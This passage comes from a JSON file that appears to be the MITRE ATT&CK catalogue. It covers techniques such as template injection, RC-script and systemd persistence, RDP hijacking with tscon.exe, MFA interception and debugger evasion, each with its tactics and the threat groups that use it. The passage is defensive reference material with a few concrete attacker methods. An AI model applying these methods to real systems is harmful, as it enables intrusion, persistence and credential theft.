more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.^[[1]](https://www.caida.org/publications/papers/2012/analysis_slash_zero/analysis_slash_zero.pdf)^ Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["TeamTNT"]},"T1221":{"id":"T1221","name":"Template Injection","description":"Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.^[[1]](https://docs.microsoft.com/previous-versions/office/developer/office-2007/aa338205(v=office.12))^\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.^[[2]](https://www.sans.org/reading-room/whitepapers/testing/template-injection-attacks-bypassing-security-controls-living-land-38780)^ These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.^[[3]](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)^ Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.^[[4]](https://blog.malwarebytes.com/threat-analysis/2017/10/decoy-microsoft-word-document-delivers-malware-through-rat/)^\n\nAdversaries may also modify the `*\\template` control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.^[[5]](https://www.proofpoint.com/us/blog/threat-insight/injection-new-black-novel-rtf-template-inject-technique-poised-widespread)^^[[6]](https://ciberseguridad.blog/decodificando-ficheros-rtf-maliciosos/)^\n\nThis technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.^[[7]](https://forum.anomali.com/t/credential-harvesting-and-malicious-file-delivery-using-microsoft-office-template-injection/2104)^^[[8]](https://blog.talosintelligence.com/2017/07/template-injection.html)^^[[9]](https://github.com/ryhanson/phishery)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":["Operation Dream Job","Frankenstein"],"groups":["Dragonfly","Confucius","Tropic Trooper","APT28","Gamaredon Group","Inception","DarkHydrus","Lazarus Group","Frankenstein","Dragonfly 2.0"]},"T1037.004":{"id":"T1037.004","name":"RC Scripts","description":"Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries can establish persistence by adding a malicious binary path or shell commands to `rc.local`, `rc.common`, and other RC scripts specific to the Unix-like distribution.^[[1]](https://iranthreats.github.io/resources/attribution-flying-rocket-kitten/)^^[[2]](https://www.intezer.com/blog-hiddenwasp-malware-targeting-linux-systems/)^ Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.^[[3]](https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/)^\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). ^[[4]](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)^^[[5]](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)^ This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.^[[6]](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf)^ To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.^[[7]](http://manpages.ubuntu.com/manpages/bionic/man8/systemd-rc-local-generator.8.html)^","platforms":["macOS","Linux"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":["APT29"]},"T1134":{"id":"T1134","name":"Access Token Manipulation","description":"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.^[[1]](https://pentestlab.blog/2017/04/03/token-manipulation/)^\n\nAny standard user can use the `runas` command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":["C0017"],"groups":["FIN6","Blue Mockingbird"]},"T1111":{"id":"T1111","name":"Multi-Factor Authentication Interception","description":"Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. ^[[1]](https://dl.mandiant.com/EE/assets/PDF_MTrends_2011.pdf)^\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). ^[[2]](https://gcn.com/cybersecurity/2011/06/rsa-confirms-its-tokens-used-in-lockheed-hack/282818/)^\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users’ phones.^[[3]](https://sec.okta.com/scatterswine)^","platforms":["Linux","Windows","macOS"],"tactics":["Credential Access"],"campaigns":["Operation Wocao"],"groups":["Kimsuky","Chimera","LAPSUS$","Operation Wocao"]},"T1027.002":{"id":"T1027.002","name":"Software Packing","description":"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.^[[1]](https://www.welivesecurity.com/wp-content/uploads/2018/01/WP-FinFisher.pdf)^ \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.^[[2]](https://github.com/dhondta/awesome-executable-packing)^  ","platforms":["macOS","Windows","Linux"],"tactics":["Defense Evasion"],"campaigns":["C0017","Night Dragon","Operation Spalax","Operation Dust Storm","2016 Ukraine Electric Power Attack","Operation Dream Job"],"groups":["The White Company","TA2541","Dark Caracal","Aoqin Dragon","MoustachedBouncer","APT39","TA505","GALLIUM","TeamTNT","APT38","Rocke","Ember Bear","Patchwork","Kimsuky","ZIRCONIUM","Threat Group-3390","APT3","Elderwood","APT29","Lazarus Group","Sandworm Team","Night Dragon"]},"T1584.007":{"id":"T1584.007","name":"Serverless","description":"Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. \n\nOnce compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.^[[1]](https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/)^^[[2]](https://blog.xpnsec.com/aws-lambda-redirector/)^ As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.^[[3]](https://awakesecurity.com/blog/threat-hunting-series-detecting-command-control-in-the-cloud/)^^[[1]](https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1071.001":{"id":"T1071.001","name":"Web Protocols","description":"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S^[[1]](http://cdn0.vox-cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf)^ and WebSocket^[[2]](https://securityintelligence.com/posts/brazking-android-malware-upgraded-targeting-brazilian-banks/)^ that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["Operation Wocao","Frankenstein","C0017","Night Dragon","C0021","2015 Ukraine Electric Power Attack","Operation CuckooBees","Operation Dream Job","C0018","SolarWinds Compromise"],"groups":["Rancor","Metador","BITTER","OilRig","Orangeworm","APT37","Dark Caracal","Magic Hound","Tropic Trooper","Chimera","LuminousMoth","APT19","APT41","Mustang Panda","APT38","BRONZE BUTLER","Sidewinder","Kimsuky","Lazarus Group","Higaisa","MuddyWater","Stealth Falcon","APT32","Inception","WIRTE","Turla","FIN13","SilverTerrier","APT28","Wizard Spider","FIN8","Confucius","Windshift","Cobalt Group","APT33","TA551","Gamaredon Group","Ke3chang","FIN4","APT18","APT39","Threat Group-3390","HAFNIUM","TeamTNT","Rocke","Sandworm Team","TA505","UNC2452","APT29","Night Dragon","Machete"]},"T1059.005":{"id":"T1059.005","name":"Visual Basic","description":"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.^[[1]](https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/)^^[[2]](https://docs.microsoft.com/dotnet/visual-basic/)^\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.^[[3]](https://docs.microsoft.com/office/vba/api/overview/)^^[[4]](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications)^ VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).^[[5]](https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85))^\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )","platforms":["Windows","macOS","Linux"],"tactics":["Execution"],"campaigns":["2016 Ukraine Electric Power Attack","Operation Dream Job","FunnyDream","Frankenstein","SolarWinds Compromise","C0015","Operation Wocao","Operation Sharpshooter","C0011","2015 Ukraine Electric Power Attack","Operation Dust Storm","Operation CuckooBees","Operation Honeybee"],"groups":["Patchwork","Higaisa","FIN4","WIRTE","Windshift","Turla","Earth Lusca","Rancor","Mustang Panda","Transparent Tribe","Silence","Gamaredon Group","FIN7","APT38","Machete","MuddyWater","BRONZE BUTLER","Confucius","TA505","Magic Hound","LazyScripter","Lazarus Group","Cobalt Group","OilRig","SideCopy","Leviathan","TA459","FIN13","Sidewinder","APT32","Molerats","TA2541","Inception","APT-C-36","HEXANE","APT33","APT37","Sandworm Team","Kimsuky","Gorgon Group","APT39","APT29","Operation Wocao","Honeybee","Sharpshooter","Frankenstein"]},"T1564.005":{"id":"T1564.005","name":"Hidden File System","description":"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.^[[1]](https://www.malwaretech.com/2014/11/virtual-file-systems-for-beginners.html)^\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.^[[1]](https://www.malwaretech.com/2014/11/virtual-file-systems-for-beginners.html)^^[[2]](https://www.fireeye.com/blog/threat-research/2015/12/fin1-targets-boot-record.html)^ Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.^[[3]](https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf)^ Adversaries may also fragment files across the existing file system structure in non-standard ways.^[[4]](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064459/Equation_group_questions_and_answers.pdf)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Equation","Strider"]},"T1543.002":{"id":"T1543.002","name":"Systemd Service","description":"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.^[[1]](http://man7.org/linux/man-pages/man1/systemd.1.html)^ Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).^[[2]](https://redcanary.com/blog/attck-t1501-understanding-systemd-service-persistence/)^ \n\nInside the `.service` unit files, the following directives are used to execute commands:^[[3]](https://www.freedesktop.org/software/systemd/man/systemd.service.html)^  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.\n* `ExecReload` directive executes when a service restarts. \n* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a `.service` file’s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.^[[4]](https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang)^^[[5]](http://www.ouah.org/backdoors.html)^^[[6]](https://www.rapid7.com/db/modules/exploit/linux/local/service_persistence)^ ","platforms":["Linux"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":["TeamTNT","Rocke"]},"T1563.002":{"id":"T1563.002","name":"RDP Hijacking","description":"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).^[[1]](https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx)^\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.^[[2]](http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html)^ This can be done remotely or locally and with active or disconnected sessions.^[[3]](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)^ It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.^[[4]](https://github.com/nccgroup/redsnarf)^","platforms":["Windows"],"tactics":["Lateral Movement"],"campaigns":[],"groups":["Axiom"]},"T1136":{"id":"T1136","name":"Create Account","description":"Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\n\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.","platforms":["Windows","Azure AD","Office 365","IaaS","Linux","macOS","Google Workspace","Network","Containers","SaaS"],"tactics":["Persistence"],"campaigns":["2016 Ukraine Electric Power Attack"],"groups":["Indrik Spider","Sandworm Team","Dragonfly"]},"T1547.013":{"id":"T1547.013","name":"XDG Autostart Entries","description":"Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.^[[1]](https://specifications.freedesktop.org/autostart-spec/autostart-spec-latest.html)^^[[2]](https://specifications.freedesktop.org/desktop-entry-spec/1.2/ar01s06.html)^\n\nAdversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user’s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.\n\nAdversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.^[[3]](https://redcanary.com/blog/netwire-remote-access-trojan-on-linux/)^","platforms":["Linux"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1584.004":{"id":"T1584.004","name":"Server","description":"Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Sharpshooter","Night Dragon","Operation Dream Job"],"groups":["Lazarus Group","Volt Typhoon","Dragonfly","Turla","APT16","Indrik Spider","Earth Lusca"]},"T1526":{"id":"T1526","name":"Cloud Service Discovery","description":"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.^[[1]](https://docs.microsoft.com/en-us/rest/api/resources/)^^[[2]](https://docs.microsoft.com/en-us/previous-versions/azure/ad/graph/howto/azure-ad-graph-api-operations-overview)^\n\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.^[[3]](https://github.com/Azure/Stormspotter)^^[[4]](https://github.com/RhinoSecurityLabs/pacu)^\n\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008).","platforms":["Azure AD","Office 365","SaaS","IaaS","Google Workspace"],"tactics":["Discovery"],"campaigns":[],"groups":[]},"T1018":{"id":"T1018","name":"Remote System Discovery","description":"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or `net view` using [Net](https://attack.mitre.org/software/S0039).\n\nAdversaries may also analyze data from local host files (ex: `C:\\Windows\\System32\\Drivers\\etc\\hosts` or `/etc/hosts`) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. `show cdp neighbors`, `show arp`).^[[1]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^^[[2]](https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a)^  \n","platforms":["Linux","macOS","Windows","Network"],"tactics":["Discovery"],"campaigns":["Operation CuckooBees","Operation Wocao","FunnyDream","2015 Ukraine Electric Power Attack","SolarWinds Compromise","2016 Ukraine Electric Power Attack","C0015"],"groups":["menuPass","Fox Kitten","Naikon","Deep Panda","Earth Lusca","FIN5","Volt Typhoon","Sandworm Team","Ke3chang","HEXANE","Threat Group-3390","BRONZE BUTLER","APT39","APT32","Silence","FIN6","Indrik Spider","Turla","Rocke","Leafminer","Magic Hound","Chimera","HAFNIUM","Wizard Spider","APT3","GALLIUM","FIN8","Dragonfly","UNC2452","APT29","Operation Wocao","Dragonfly 2.0"]},"T1046":{"id":"T1046","name":"Network Service Discovery","description":"Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.^[[1]](https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a)^   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as `dns-sd -B _ssh._tcp .`) to find other systems broadcasting the ssh service.^[[2]](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/NetServices/Introduction.html)^^[[3]](https://themittenmac.com/what-does-apt-activity-look-like-on-macos/)^","platforms":["Windows","IaaS","Linux","macOS","Containers","Network"],"tactics":["Discovery"],"campaigns":["CostaRicto","C0027","C0018","Operation Wocao"],"groups":["APT39","BlackTech","menuPass","Threat Group-3390","FIN13","DarkVishnya","OilRig","Lazarus Group","Leafminer","Tropic Trooper","Naikon","Magic Hound","Rocke","APT32","Chimera","APT41","Suckfly","FIN6","TeamTNT","BackdoorDiplomacy","Fox Kitten","Cobalt Group","Operation Wocao","CostaRicto","APT34"]},"T1590.001":{"id":"T1590.001","name":"Domain Properties","description":"Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).^[[1]](https://www.whois.net/)^^[[2]](https://dnsdumpster.com/)^^[[3]](https://www.circl.lu/services/passive-dns/)^ Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.^[[4]](https://o365blog.com/post/just-looking/)^^[[5]](https://docs.microsoft.com/en-us/archive/blogs/tip_of_the_day/cloud-tip-of-the-day-advanced-way-to-check-domain-availability-for-office-365-and-azure)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Sandworm Team"]},"T1518":{"id":"T1518","name":"Software Discovery","description":"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace"],"tactics":["Discovery"],"campaigns":["Operation Dust Storm","Operation Wocao"],"groups":["Volt Typhoon","Windigo","Inception","BRONZE BUTLER","Windshift","MuddyWater","Wizard Spider","SideCopy","Sidewinder","Mustang Panda","HEXANE","Tropic Trooper","Operation Wocao"]},"T1538":{"id":"T1538","name":"Cloud Service Dashboard","description":"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.^[[1]](https://cloud.google.com/security-command-center/docs/quickstart-scc-dashboard)^\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.","platforms":["Azure AD","Office 365","IaaS","Google Workspace"],"tactics":["Discovery"],"campaigns":[],"groups":[]},"T1055.005":{"id":"T1055.005","name":"Thread Local Storage","description":"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).^[[1]](https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html)^\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. ","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":[]},"T1622":{"id":"T1622","name":"Debugger Evasion","description":"Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.^[[1]](https://github.com/processhacker/processhacker)^\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary, but may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as `IsDebuggerPresent()` and ` NtQueryInformationProcess()`, or manually checking the `BeingDebugged` flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential 